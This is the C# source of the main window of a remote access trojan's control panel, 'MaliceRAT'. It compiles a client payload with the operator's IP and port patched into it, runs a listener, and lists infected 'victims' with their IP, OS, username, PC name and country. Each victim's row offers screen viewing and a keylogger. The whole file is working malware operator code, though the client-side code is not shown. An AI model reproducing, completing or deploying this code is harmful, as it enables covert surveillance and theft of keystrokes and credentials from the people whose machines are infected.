using System;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Drawing;
using System.Collections.Generic;
using System.Net;
using System.Diagnostics;
using MaliceRAT.RatServer;
using MaliceRAT.RatUI;

namespace MaliceRAT
{
    public partial class Main : Form
    {
        readonly Server server = new Server();
        
        public Main()
        {
            InitializeComponent();
            InitializeContextMenu();
            InitializeBuild();
            InitializeConfig();

            server.StartServer();
            server.InfoReceived += Server_InfoReceived;
            server.ClientDisconnected += Server_ClientDisconnected;
        }
        #region Config
        private void setConfigKey(string key, string value)
        {
            string configPath = Path.Combine(Application.StartupPath, "config.json");
            if (File.Exists(configPath))
            {
                string configJson = File.ReadAllText(configPath);
                var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
                dynamic config = serializer.Deserialize<dynamic>(configJson);
                config[key] = value;
                string newConfigJson = serializer.Serialize(config);
                File.WriteAllText(configPath, newConfigJson);
            }
        }

        private void InitializeConfig()
        {
            gunaHostIP.TextChanged += (sender, e) =>
            {
                setConfigKey("server_ip", gunaHostIP.Text);
            };
            gunaHostPort.TextChanged += (sender, e) =>
            {
                setConfigKey("server_port", gunaHostPort.Text);
            };
        }
        #endregion

        #region Build
        private async Task<string> CompileClientExeAsync()
        {
            string projectPath = gunaProjPath.Text;
            string outputPath = Path.Combine(Application.StartupPath);

            string configFilePath = Path.Combine(Path.GetDirectoryName(projectPath), "Config.cs");
            string originalConfigFileContents = File.ReadAllText(configFilePath);

            string configPath = Path.Combine(Application.StartupPath, "config.json");
            string configJson = File.ReadAllText(configPath);
            var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
            dynamic config = serializer.Deserialize<dynamic>(configJson);

            string modifiedConfigFileContents = originalConfigFileContents.Replace("127.0.0.1", config["server_ip"].ToString());
            modifiedConfigFileContents = modifiedConfigFileContents.Replace("6666", config["server_port"].ToString());
            modifiedConfigFileContents = modifiedConfigFileContents.Replace("5120", config["server_bufferSize"].ToString());

            File.WriteAllText(configFilePath, modifiedConfigFileContents);

            for (int i = 0; i < 2; i++)
            {
                string msbuildPath = gunaBuildPath.Text;

                if (string.IsNullOrEmpty(msbuildPath))
                {
                    MessageBox.Show("MSBuild.exe not found.");
                    File.WriteAllText(configFilePath, originalConfigFileContents);
                    return null;
                }

                var startInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = msbuildPath,
                    Arguments = $"/p:Configuration=Debug /p:OutputPath={outputPath} {projectPath}",
                    WorkingDirectory = projectPath.Substring(0, projectPath.LastIndexOf("\\")),
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                string error = null;
                await Task.Run(() =>
                {
                    using (var process = System.Diagnostics.Process.Start(startInfo))
                    {
                        while (!process.StandardOutput.EndOfStream)
                        {
                            string line = process.StandardOutput.ReadLine();
                            Console.WriteLine(line);
                        }
                        process.WaitForExit();

                        if (process.ExitCode != 0)
                        {
                            error = process.StandardError.ReadToEnd();
                        }
                    }
                });

                if (!string.IsNullOrEmpty(error))
                {
                    MessageBox.Show($"MSBuild error: {error}");
                    File.WriteAllText(configFilePath, originalConfigFileContents);
                    return null;
                }
            }

            File.WriteAllText(configFilePath, originalConfigFileContents);
            
            return outputPath;
        }

        private async void buildButton_Click(object sender, EventArgs e)
        {
            string exePath = await CompileClientExeAsync();

            if (exePath != null)
            {
                MessageBox.Show("Client built successfully: " + exePath);

                if (gunaOpenFolder.Checked)
                {
                    System.Diagnostics.Process.Start("explorer.exe", Application.StartupPath);
                }
            }
        }

        private void InitializeBuild()
        {
            // Find default paths
            string msbuildPath = new List<string>
            {
                @"C:\Program Files\Microsoft Visual Studio\Community 2022\MSBuild\Current\Bin\amd64\MSBuild.exe",
                @"C:\Program Files\Microsoft Visual Studio\Community 2022\MSBuild\Current\Bin\MSBuild.exe",
                @"C:\Program Files (x86)\MSBuild\14.0\Bin\MSBuild.exe",
                @"C:\Program Files (x86)\MSBuild\15.0\Bin\MSBuild.exe",
                @"C:\Program Files (x86)\MSBuild\Current\Bin\MSBuild.exe"
            }.Find(File.Exists);

            string projPath = new List<string>
            {
                Path.GetFullPath(Path.Combine(Application.StartupPath, @"\RatClient\RatClient.csproj")),
                Path.GetFullPath(Path.Combine(Application.StartupPath, @"..\..\RatClient\RatClient.csproj"))
            }.Find(File.Exists);

            gunaBuildPath.Text = msbuildPath;
            gunaProjPath.Text = projPath;
            
            gunaHostIP.Text = Utilities.GetLanIp();
            setConfigKey("server_ip", gunaHostIP.Text);
        }

        private void gunaFindBuild_Click(object sender, EventArgs e)
        {
            OpenFileDialog buildFileDialog = new OpenFileDialog();
            buildFileDialog.Multiselect = false;
            buildFileDialog.Filter = "MSBuild.exe|*.exe";
            buildFileDialog.Title = "MSBuilder searcher";
            
            if (buildFileDialog.ShowDialog() == DialogResult.OK)
            {
                gunaBuildPath.Text = buildFileDialog.FileName;
            }
        }

        private void gunaFindProj_Click(object sender, EventArgs e)
        {
            OpenFileDialog projectFileDialog = new OpenFileDialog();
            projectFileDialog.Multiselect = false;
            projectFileDialog.InitialDirectory = Environment.CurrentDirectory;
            projectFileDialog.Filter = "RatClient.csproj|*.csproj";
            projectFileDialog.Title = "Client project searcher";

            if (projectFileDialog.ShowDialog() == DialogResult.OK)
            {
                gunaProjPath.Text = projectFileDialog.FileName;
            }
        }

        private void gunaGetMSBuild_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.FileName = "vs_BuildTools.exe";
            saveFileDialog.Filter = "Executable files (*.exe)|*.exe";

            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                buildDownloadProgressBar.Visible = true;
                using (WebClient client = new WebClient())
                {
                    client.DownloadProgressChanged += (s, ev) =>
                    {
                        buildDownloadProgressBar.Value = ev.ProgressPercentage;
                    };
                    client.DownloadFileCompleted += (s, ev) =>
                    {
                        buildDownloadProgressBar.Visible = false;
                        Process.Start(saveFileDialog.FileName);
                    };
                    client.DownloadFileAsync(new Uri("https://aka.ms/vs/17/release/vs_BuildTools.exe"), saveFileDialog.FileName);
                }
            }
        }
        #endregion
        
        #region Victims table
        private async Task AddVictimToGrid(Victim victim) 
        {
            if (InvokeRequired) 
            {
                Invoke(new Action(async () => await AddVictimToGrid(victim)));
                return;
            }

            int rowIndex = gunaVictimsTable.Rows.Add();
            DataGridViewRow row = gunaVictimsTable.Rows[rowIndex];

            row.Cells["ID"].Value = victim.Id;
            row.Cells["IP"].Value = victim.IP;
            row.Cells["OS"].Value = victim.OS;
            row.Cells["USER"].Value = victim.User;
            row.Cells["PC"].Value = victim.PC;

            string ipToUse = victim.IP == "127.0.0.1" || victim.IP == Utilities.GetLanIp() ? await Utilities.GetPublicIPAddress() : victim.IP;
            Image flagImage = await Utilities.GetFlagFromIP(ipToUse);

            row.Cells["Flag"].Value = flagImage;

            for (int i = 0; i < gunaVictimsTable.Columns.Count; i++)
            {
                if(row.Cells[i].Value == null) {
                    row.Cells[i].Value = "N/A";
                }
            }
        }
        public void RemoveVictimFromGrid(Victim victim)
        {
            if (gunaVictimsTable.InvokeRequired)
            {
                gunaVictimsTable.Invoke(new Action(() => {
                    RemoveVictimById(victim.Id);
                }));
            } else {
                RemoveVictimById(victim.Id);
            }
        }
        private void RemoveVictimById(int id)
        {
            foreach (DataGridViewRow row in gunaVictimsTable.Rows) {
                if (row.Cells["ID"].Value != null && (int)row.Cells["ID"].Value == id) {
                    gunaVictimsTable.Rows.Remove(row);
                    break;
                }
            }
        }
        #endregion

        #region Server events
        private async void Server_InfoReceived(Victim client) 
        {
            await AddVictimToGrid(client);
        }
        private void Server_ClientDisconnected(Victim client) 
        {
            RemoveVictimFromGrid(client);
        }
        #endregion

        #region Context Menu
        private int? GetSelectedId()
        {
            if (gunaVictimsTable.SelectedRows.Count > 0)
            {
                int selectedRowIndex = gunaVictimsTable.SelectedRows[0].Index;
                if (selectedRowIndex != -1)
                {
                    var idCell = gunaVictimsTable.Rows[selectedRowIndex].Cells["ID"];
                    if (idCell != null && idCell.Value != null)
                    {
                        return (int)idCell.Value;
                    }
                }
            }
            return null;
        }
        
        private void InitializeContextMenu()
        {
            ContextMenuStrip victimContextMenu = new ContextMenuStrip();

            ToolStripMenuItem viewScreenItem = ContextMenuUtilities.CreateContextMenuItem("View Screen", ViewScreen_Click);
            ToolStripMenuItem keyLoggerItem = ContextMenuUtilities.CreateContextMenuItem("Key Logger", KeyLogger_Click);
            ToolStripMenuItem disconnectItem = ContextMenuUtilities.CreateContextMenuItem("Disconnect", Disconnect_Click);
            
            victimContextMenu.Items.AddRange(new ToolStripItem[] { viewScreenItem, keyLoggerItem, disconnectItem });

            gunaVictimsTable.ContextMenuStrip = victimContextMenu;
            gunaVictimsTable.MouseDown += (sender, e) => ContextMenuUtilities.GunaVictimsTable_MouseDown(sender, e, gunaVictimsTable);
        }

        private void ViewScreen_Click(object sender, EventArgs e)
        {
            var id = GetSelectedId();
            if (id.HasValue)
            {
                ScreenViewForm screenViewForm = new ScreenViewForm(id.Value, server);
                screenViewForm.Show();
            }
        }

        private void KeyLogger_Click(object sender, EventArgs e)
        {
            var id = GetSelectedId();
            if (id.HasValue)
            {
                KeyLoggerForm keyLoggerForm = new KeyLoggerForm(id.Value, server);
                keyLoggerForm.Show();
            }
        }

        private void Disconnect_Click(object sender, EventArgs e)
        {
            var id = GetSelectedId();
            if (id.HasValue)
            {
                server.GetVictimById(id.Value).Disconnect();
            }
        }
        #endregion
    }
}